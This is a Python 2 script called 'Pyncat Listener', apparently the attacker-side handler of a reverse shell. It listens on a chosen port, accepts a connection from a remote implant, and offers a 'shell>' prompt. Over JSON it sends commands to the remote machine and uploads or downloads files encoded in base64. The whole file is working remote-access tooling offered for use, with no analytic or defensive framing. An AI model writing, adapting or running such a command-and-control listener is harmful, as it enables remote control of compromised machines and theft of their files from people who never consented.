#!/usr/bin/env python
import socket
import json
import base64
import argparse


class Listener:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Reconnect if connection is lost
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        self.connection, address = listener.accept()

        print("[+] Connection from {0}:{1}\n").format(address[0], address[1])

    def json_send(self, data):
        jsend = json.dumps(data)
        return self.connection.send(jsend)

    def json_recv(self):
        json_receiv = ""
        while True:

            try:

                json_receiv = json_receiv + self.connection.recv(1024)
                return json.loads(json_receiv)

            except ValueError:
                # print("FAILURE Receive")
                continue

    def write_file(self, fdata, content):
        try:
            if len(content) > 1:
                with open(fdata, "wb") as f:
                    f.write(base64.b64decode(content))
                    print("[*] File saved !")
            else:
                print("suckkkkkkkkkkkkkkkkkkkkkkk")
        except Exception:
            print("File not found")

    def read_file(self, fileupload):
        try:
            with open(fileupload, "rb") as f:

                return base64.b64encode(f.read())

        except Exception:
            print("[-] No such file or directory")

    def exec_cmd(self, command):

        if command[0] == "exit":
            self.json_send(command)
            print("[*] Closing connection ...")
            exit(0)
            # return self.connection.close()
        else:
            self.json_send(command)
            return self.json_recv()

    def run(self):

        try:
            while True:
                cmd = raw_input("shell> ")
                cmd = cmd.split(" ")

                try:
                    if cmd[0] == "upload":
                        content = self.read_file(cmd[1])
                        # print("TEST" + content)
                        cmd.append(content)
                        # print(cmd[2])
                    result = self.exec_cmd(cmd)

                    if cmd[0] == "download" and not "error in command" in result:
                        result = self.write_file((cmd[1]), result)

                    print(result)
                except Exception:
                    result = "[-] Error in command "

        except KeyboardInterrupt:
            print("\n\r[*] Closing connection")


def main():

    parser = argparse.ArgumentParser(prog="Pyncat Listener", usage="-p listening port")
    parser.add_argument("-p", "--port", help="Port number")

    args = parser.parse_args()
    port = args.port
    port = int(port)

    try:
        if port is None or port > 65535:
            print("[-] Cannot set up listener, exiting ...")
            print(parser.print_help())

        elif port < 1025:
            print("[-] Require high privilege account, use sudo...")

        else:
            print("[+] Listening on 0.0.0.0:{0}").format(port)
            my_server = Listener("0.0.0.0", port)
            my_server.run()

    except Exception:
        print("[-] Listener error")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nCtrl-C detected ... exiting !")
